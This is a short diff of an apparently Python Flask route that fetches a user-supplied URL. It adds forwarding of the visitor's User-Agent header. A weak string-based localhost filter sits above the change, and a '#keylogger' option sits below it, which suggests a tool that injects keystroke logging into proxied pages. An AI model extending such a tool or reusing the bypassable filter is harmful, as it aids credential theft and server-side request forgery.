@@ -141,7 +141,13 @@ def link():
 	url = request.args.get("url")
 	if h in url or ipb in url or "127.0.0.1" in url or "localhost" in url or "192.168." in url or "0.0.0.0" in url:
 		url="https://en.wikipedia.org/wiki/Idiot"
-	r = requests.get(url, allow_redirects=False)
+
+
+	#Add add the user headers to the http request.
+	headers = {
+		"User-Agent": request.headers.get("User-Agent")
+	}
+	r = requests.get(url, allow_redirects=False, headers=headers)
 
 	#keylogger
 	if opt == 1:
